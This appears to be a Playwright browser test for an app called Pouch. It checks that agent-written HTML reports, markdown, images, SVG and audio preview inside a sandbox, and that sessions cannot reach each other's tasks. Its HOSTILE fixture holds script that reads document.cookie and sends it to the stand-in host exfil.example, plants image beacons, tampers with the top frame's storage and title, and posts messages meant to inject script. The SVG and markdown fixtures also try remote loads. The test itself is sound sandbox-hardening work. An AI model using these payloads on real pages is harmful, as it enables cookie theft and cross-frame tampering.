// Batch G in a real page (fake Sealed model, test/graph-fixture.js): previews
// and HTML reports. A report the agent links opens in Preview, Static (no
// script runs); Interactive runs its scripts; Raw is one click away and each
// kind remembers its mode; markdown previews with Pouch's own renderer;
// images, SVG and audio preview from blobs with no Save; a hostile report is
// contained inside Pouch; an oversized report says so; and main cannot reach
// another session's tasks through /task.
// Run: node test/batchG-browser.mjs
import assert from 'node:assert/strict';
import { readFileSync, mkdtempSync, mkdirSync, rmSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { createServer } from 'node:http';
import { createHash } from 'node:crypto';
import { build } from 'esbuild';
import { headersFile, headersFor, viewerCsp } from '../headers.mjs';
const pw = await import(process.env.PLAYWRIGHT_MODULE || '/Users/adam/Desktop/openchamber-maxwell/node_modules/playwright/index.mjs');
setTimeout(() => { console.error('FAIL: over 4 minutes'); process.exit(2); }, 240_000).unref();
const root = resolve(import.meta.dirname, '..');
const scratch = mkdtempSync(join(process.env.POUCH_TEST_TMP || tmpdir(), 'pouch-batchG-'));
const shots = process.env.POUCH_SHOTS || '/tmp/pouch-qa/shots';
mkdirSync(shots, { recursive: true });
const stub = `
import { createFake } from './test/graph-fixture.js';
window.fake = createFake();
export class TinfoilAI {
  constructor() { this.openAIOptions = { apiKey: 'fake' };
    this.chat = { completions: { create: async () => { throw new Error('the old plaintext title path was used'); } } };
    this.secureClient = { fetch: (u, i) => window.fake.fetch(u, i) };
  }
  async ready() {} async getVerificationDocument() { return { securityVerified: true }; }
}`;
const worker = (await build({ entryPoints: [join(root, 'src/run/worker-browser.js')], bundle: true, minify: true, write: false, format: 'iife' })).outputFiles[0].text;
const bundled = await build({ entryPoints: [join(root, 'src/main.js')], bundle: true, write: false, format: 'iife',
  define: { WORKER_SRC: JSON.stringify(worker), LOCAL_MODEL: 'null', SW_SHA256: '"test"' },
  alias: { 'node:zlib': join(root, 'src/shims/zlib.js'), zlib: join(root, 'src/shims/zlib.js'), 'decode-named-character-reference': join(root, 'node_modules/decode-named-character-reference/index.js') },
  plugins: [{ name: 'fake-tinfoil', setup(b) { b.onResolve({ filter: /^tinfoil$/ }, () => ({ path: 'fake', namespace: 'fixture' })); b.onLoad({ filter: /.*/, namespace: 'fixture' }, () => ({ contents: stub, loader: 'js', resolveDir: root })); } }] });
let html = readFileSync(join(root, 'pouch.html'), 'utf8').replace('<script>/*APP*/</script>', () => '<script>' + bundled.outputFiles[0].text.replaceAll('</script', '<\\/script') + '</script>');
html = html.replace('__SCRIPT_HASHES__', [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(([, s]) => `'sha256-${createHash('sha256').update(s).digest('base64')}'`).join(' '));
// The deploy's headers (headers.mjs): the page's CSP as a header too, the viewer its own.
const HEADERS = headersFile(html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/)[1], viewerCsp(root));
const server = createServer((req, res) => {
  const path = new URL(req.url, 'http://x').pathname;
  const viewer = path === '/viewer.html';
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', ...headersFor(HEADERS, viewer ? path : '/pouch.html') });
  res.end(viewer ? readFileSync(join(root, 'viewer.html')) : html);
});
await new Promise((r) => server.listen(Number(process.env.PORT ?? 0), '127.0.0.1', r));
const url = `http://127.0.0.1:${server.address().port}`;
let passed = 0;
const t0 = Date.now();
const ok = (name) => { passed++; console.log('ok', name, `(${((Date.now() - t0) / 1000).toFixed(0)} s)`); };
const errors = [], outbound = [];
const T = { timeout: 15000 };

async function open(name) {
  const context = await pw.chromium.launchPersistentContext(join(scratch, name), { headless: true, viewport: { width: 1280, height: 800 } });
  await context.route(/^https?:\/\/(?!127\.0\.0\.1[:/]|localhost[:/])/, (r) => {
    const u = new URL(r.request().url());
    if (u.pathname === '/sealed/models') return r.fulfill({ json: { data: [{ id: 'fake', name: 'fake', tool_calling: true, multimodal: false, endpoints: ['/v1/chat/completions'] }] } });
    if (u.pathname.includes('usage')) return r.fulfill({ json: {} });
    if (u.hostname !== 'api.bayleaf.dev') outbound.push(r.request().url());
    return r.abort();
  });
  const page = context.pages()[0] ?? await context.newPage();
  page.on('pageerror', (e) => errors.push(e.message));
  if (process.env.DEBUG) page.on('console', (m) => console.log('console:', m.text().slice(0, 300)));
  await page.goto(url);
  await page.waitForSelector('#badge.ok', T);
  await page.click('#welcome button >> text=Got it', { timeout: 2000 }).catch(() => {});
  return { context, page };
}
const rule = (page, r) => page.evaluate((r) => { window.fake.rule({ ...r, when: r.when ? new Function('c', 'return ' + r.when) : undefined }); }, r);
const gate = (page, g) => page.evaluate((g) => { window.fake.gates[g] = true; }, g);
const idle = (page) => page.waitForFunction(() => document.getElementById('send-label')?.textContent === 'Send', null, T);
async function send(page, text) { await page.fill('#input', text); await page.press('#input', 'Enter'); }
async function term(page, cmd) {
  if (!(await page.isVisible('#term-input'))) { await page.keyboard.press('Control+`'); await page.waitForSelector('#term-input', { state: 'visible', ...T }); }
  const n = await page.$$eval('#term-log .term-block', (l) => l.length);
  await page.fill('#term-input', cmd); await page.press('#term-input', 'Enter');
  await page.waitForFunction((n) => { const b = document.querySelectorAll('#term-log .term-block'); return b.length > n && !b[b.length - 1].querySelector('.term-live'); }, n, T);
  return page.$eval('#term-log .term-block:last-child', (b) => b.textContent);
}
// Files dropped onto the tree, as a person would (bytes made in the page).
const drop = (page, files) => page.evaluate((files) => {
  const dt = new DataTransfer();
  for (const f of files) dt.items.add(new File([Uint8Array.from(atob(f.b64), (c) => c.charCodeAt(0))], f.name, { type: f.type }));
  document.getElementById('tree').dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }));
}, files);
const b64 = (s) => Buffer.from(s).toString('base64');
const viewerFrame = (page) => page.frames().find((f) => f.url().endsWith('/viewer.html'));
const reportFrame = (page) => page.frames().find((f) => f.parentFrame() === viewerFrame(page) && f.url() === 'about:srcdoc');
const pressed = (page, sel) => page.$eval(`${sel} [aria-pressed="true"]`, (b) => b.textContent);
const openFromTree = async (page, path) => { if (!(await page.isVisible('#tree'))) await page.click('#rail [data-panel="files"]'); await page.click(`#tree .row[data-path="${path}"]`); await page.waitForFunction((p) => document.getElementById('editor-path').textContent === p, path, T); };

const REPORT = `<!doctype html><html><head><title>Sales</title><style>body{font:16px sans-serif} .bar{background:#2a7;height:12px}</style></head>
<body><h1>Sales by region</h1><div class="bar" style="width:60%"></div><p id="js">scripts did not run</p>
<script>document.getElementById('js').textContent = 'scripts ran';</script></body></html>`;
const HOSTILE = `<!doctype html><h1>Totally normal report</h1>
<img src="https://exfil.example/img?d=SECRET"><link rel="preconnect" href="https://exfil.example">
<script>
let c = ''; try { c = document.cookie; } catch {}
fetch('https://exfil.example/fetch?d=' + encodeURIComponent(c)).catch(() => {});
try { top.localStorage.setItem('pouch.display', 'pwned'); } catch {}
try { top.document.title = 'pwned'; } catch {}
top.postMessage({ html: '<b>x</b>', scripts: true }, '*');
parent.postMessage({ html: '<script>top.postMessage("VIEWER-ACCEPTED","*")<\\/script>', scripts: true }, '*');
new Image().src = '${url}/?leak=SECRET';
setTimeout(() => { location = 'https://exfil.example/nav'; }, 200);
</script>`;
// A 1x1 PNG, an SVG whose script must not run, a 0.1 s WAV.
const PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
const SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><circle cx="20" cy="20" r="18" fill="#2a7"/><script>parent.document.title="svg ran"</script><image href="https://exfil.example/svg.png" width="10" height="10"/></svg>';
const wav = (() => { const n = 800, b = Buffer.alloc(44 + n); b.write('RIFF', 0); b.writeUInt32LE(36 + n, 4); b.write('WAVEfmt ', 8); b.writeUInt32LE(16, 16); b.writeUInt16LE(1, 20); b.writeUInt16LE(1, 22); b.writeUInt32LE(8000, 24); b.writeUInt32LE(8000, 28); b.writeUInt16LE(1, 32); b.writeUInt16LE(8, 34); b.write('data', 36); b.writeUInt32LE(n, 40); for (let i = 0; i < n; i++) b[44 + i] = 128 + Math.round(60 * Math.sin(i / 3)); return b.toString('base64'); })();

let s;
try {
  s = await open('g');
  const { page } = s;

  // 1. The agent writes a report and links it; the link opens Preview, Static.
  await rule(page, { who: 'main', when: '/report/.test(c.since)', reply: [['write', { path: '/work/report.html', content: REPORT }]] });
  await rule(page, { who: 'main', when: '/Successfully wrote|Wrote|wrote/.test(c.since)', reply: 'Done: [the report](/work/report.html).' });
  await rule(page, { who: 'title', reply: 'Report', sticky: false });
  await send(page, 'Make me a sales report');
  await idle(page);
  await page.click('#log .md button:has-text("the report"), #log .md a:has-text("the report")');
  await page.waitForFunction(() => document.getElementById('editor-path').textContent === '/work/report.html', null, T);
  assert.equal(await pressed(page, '#view-mode'), 'Preview');
  assert.equal(await pressed(page, '#script-mode'), 'Static');
  assert.match(await page.textContent('#preview-note'), /Static: no scripts run/);
  await page.waitForFunction(() => document.querySelector('#preview iframe.viewer'), null, T);
  await page.waitForTimeout(500);
  assert.ok(viewerFrame(page) && reportFrame(page), 'viewer and report frames exist');
  assert.equal(await page.$eval('#preview iframe.viewer', (f) => f.getAttribute('sandbox')), 'allow-scripts');
  await page.screenshot({ path: join(shots, 'batchG-report-static.png') });
  ok('a report the agent links opens in Preview, Static, in a sandboxed viewer');

  // 2. Interactive runs its scripts and says what is left open; reopening starts Static again.
  await page.click('#script-mode [data-scripts="on"]');
  await page.waitForFunction(() => /WebRTC/.test(document.getElementById('preview-note').textContent), null, T);
  await page.waitForTimeout(600);
  assert.equal(await reportFrame(page).textContent('#js'), 'scripts ran');
  await page.screenshot({ path: join(shots, 'batchG-report-interactive.png') });
  await page.click('#close-file');
  await page.click('#log .md button:has-text("the report"), #log .md a:has-text("the report")');
  await page.waitForFunction(() => document.querySelector('#script-mode [aria-pressed="true"]')?.textContent === 'Static', null, T);
  ok('Interactive runs the report\'s scripts and names WebRTC; it is not remembered');

  // 3. Raw is one click; HTML from the tree then opens Raw (remembered per kind); a link still opens Preview.
  await page.click('#view-mode [data-mode="raw"]');
  await page.waitForFunction(() => !document.getElementById('editor').hidden && /Sales by region/.test(document.querySelector('#editor .cm-content').textContent), null, T);
  assert.equal(await page.isHidden('#preview'), true);
  await page.click('#close-file');
  await openFromTree(page, '/work/report.html');
  assert.equal(await pressed(page, '#view-mode'), 'Raw');
  await page.click('#close-file');
  await page.click('#log .md button:has-text("the report"), #log .md a:has-text("the report")');
  await page.waitForFunction(() => document.querySelector('#view-mode [aria-pressed="true"]')?.textContent === 'Preview', null, T);
  ok('Raw is one click away; the tree remembers Raw for HTML; a reply link opens Preview');

  // 4. Markdown: Raw by default, Preview with Pouch's renderer (no remote image), saved version while dirty.
  await page.click('#close-file');
  await drop(page, [{ name: 'notes.md', type: 'text/markdown', b64: b64('# Notes\n\nSee ![chart](https://exfil.example/c.png) and ![pic](pic.png).\n') }, { name: 'pic.png', type: 'image/png', b64: PNG }]);
  await page.waitForSelector('#tree .row[data-path="/work/notes.md"]', T);
  await openFromTree(page, '/work/notes.md');
  assert.equal(await pressed(page, '#view-mode'), 'Raw');
  await page.click('#view-mode [data-mode="preview"]');
  await page.waitForSelector('#preview .md-preview h1', T);
  assert.equal(await page.textContent('#preview .md-preview h1'), 'Notes');
  await page.waitForSelector('#preview .md-preview img', T);
  const imgs = await page.$$eval('#preview .md-preview img', (l) => l.map((i) => i.src));
  assert.ok(imgs.length === 1 && imgs[0].startsWith('blob:'), `only the local image is drawn: ${imgs}`);
  assert.match(await page.textContent('#preview .md-preview'), /image: chart/);
  await page.click('#view-mode [data-mode="raw"]');
  await page.click('#editor .cm-content'); await page.keyboard.press('Control+End'); await page.keyboard.type('\nunsaved line');
  await page.click('#view-mode [data-mode="preview"]');
  await page.waitForFunction(() => /saved version/.test(document.getElementById('preview-note').textContent), null, T);
  assert.doesNotMatch(await page.textContent('#preview .md-preview'), /unsaved line/);
  await page.click('#view-mode [data-mode="raw"]');
  await page.click('#save');
  await page.waitForFunction(() => document.getElementById('save').disabled, null, T);
  ok('markdown previews with Pouch\'s renderer: local images only; unsaved edits are noted, not shown');

  // 5. Images, SVG and audio: a preview only, from blobs, no Save; the SVG's script does not run.
  await page.click('#close-file');
  await drop(page, [{ name: 'logo.svg', type: 'image/svg+xml', b64: b64(SVG) }, { name: 'tone.wav', type: 'audio/wav', b64: wav }]);
  await page.waitForSelector('#tree .row[data-path="/work/tone.wav"]', T);
  await openFromTree(page, '/work/pic.png');
  await page.waitForSelector('#preview img.preview-image', T);
  assert.equal(await page.isHidden('#save'), true); assert.equal(await page.isHidden('#view-mode'), true);
  assert.equal(await page.$eval('#preview img.preview-image', (i) => i.complete && i.naturalWidth), 1);
  await page.click('#close-file');
  await openFromTree(page, '/work/logo.svg');
  assert.equal(await pressed(page, '#view-mode'), 'Preview');
  await page.waitForFunction(() => { const i = document.querySelector('#preview img.preview-image'); return i?.complete && i.naturalWidth === 40; }, null, T);
  assert.notEqual(await page.title(), 'svg ran');
  await page.click('#close-file');
  await openFromTree(page, '/work/tone.wav');
  await page.waitForFunction(() => { const a = document.querySelector('#preview audio.preview-audio'); return a?.src.startsWith('blob:') && a.readyState >= 1 && a.duration > 0; }, null, T);
  await page.screenshot({ path: join(shots, 'batchG-audio.png') });
  ok('PNG, SVG (as an image: its script does not run) and WAV preview from blobs, with no Save');

  // 6. A hostile report, Interactive, inside Pouch: nothing leaves, Pouch's state is untouched.
  await page.click('#close-file');
  const before = await page.evaluate(() => [localStorage.getItem('pouch.display'), document.title]);
  outbound.length = 0;
  await drop(page, [{ name: 'evil.html', type: 'text/html', b64: b64(HOSTILE) }]);
  await page.waitForSelector('#tree .row[data-path="/work/evil.html"]', T);
  await openFromTree(page, '/work/evil.html');
  await page.click('#view-mode [data-mode="preview"]').catch(() => {});
  await page.click('#script-mode [data-scripts="on"]');
  await page.waitForTimeout(1500);
  assert.deepEqual(outbound, [], 'no request left the page');
  assert.deepEqual(await page.evaluate(() => [localStorage.getItem('pouch.display'), document.title]), before);
  assert.equal(await page.textContent('#editor-path'), '/work/evil.html');
  ok('a hostile report (Interactive) reaches no network, no Pouch storage and no Pouch handler');

  // 7. Over 5 MB: a clear message, Raw still works.
  await page.click('#close-file');
  await drop(page, [{ name: 'big.html', type: 'text/html', b64: b64('<p>' + 'x'.repeat(5.5 * 2 ** 20)) }]);
  await page.waitForSelector('#tree .row[data-path="/work/big.html"]', T);
  await openFromTree(page, '/work/big.html');
  await page.click('#view-mode [data-mode="preview"]').catch(() => {});
  await page.waitForFunction(() => /up to 5 MB/.test(document.getElementById('preview').textContent), null, T);
  await page.click('#close-file');
  await s.context.setOffline(true);
  await openFromTree(page, '/work/report.html');
  await page.click('#view-mode [data-mode="preview"]').catch(() => {});
  await page.waitForFunction(() => /needs a connection/.test(document.getElementById('preview').textContent), null, T);
  await s.context.setOffline(false);
  await page.click('#close-file');
  ok('a report over 5 MB says so instead of rendering; offline, Preview says why and offers Raw');

  // 8. /task is scoped: session B's main cannot see or kill session A's subagent.
  await rule(page, { who: 'main', when: '/background survey/.test(c.since)', reply: [['subagent', { action: 'spawn', name: 'scout', task: 'Survey.' }]] });
  await rule(page, { who: 'main', when: '/Started subagent "scout"/.test(c.since)', reply: 'Scout is on it.' });
  await rule(page, { who: 'scout', gate: 'never', reply: 'done' });
  await send(page, 'Start a background survey');
  await idle(page);
  await page.waitForFunction(() => [...document.querySelectorAll('#tray-list li')].some((l) => l.dataset.key?.startsWith('sa:')), null, T);
  const id = (await term(page, 'grep -l subagent /task/*/status')).match(/\/task\/(\d+)\/status/)[1];
  await page.evaluate(() => document.getElementById('new').click());
  await rule(page, { who: 'main', when: '/kill it/.test(c.since)', reply: [['bash', { command: `ls /task; cat /task/${id}/status; echo kill > /task/${id}/ctl` }]] });
  await rule(page, { who: 'main', when: '/No such file|ENOENT/.test(c.since)', reply: 'I cannot reach it.' });
  await send(page, 'kill it');
  await idle(page);
  const saw = await page.evaluate(() => JSON.stringify(window.fake.requests.main.at(-1).messages.at(-1)));
  assert.match(saw, /No such file|ENOENT/);
  assert.match(await term(page, `cat /task/${id}/status`), /running [\d.]+s subagent scout/);
  ok('main in another session finds no such task and cannot kill it; the terminal still sees it');

  assert.deepEqual(errors, [], 'no page errors');
  console.log(`batchG-browser: ${passed} passed`);
} catch (e) {
  await s?.page.screenshot({ path: join(shots, 'batchG-fail.png') }).catch(() => {});
  console.log('editor-path:', await s?.page.textContent('#editor-path').catch(() => '?'), '| status:', await s?.page.textContent('#status').catch(() => '?'), '| errors:', errors);
  throw e;
} finally {
  await s?.context.close();
  server.close();
  rmSync(scratch, { recursive: true, force: true });
}
process.exit(0);
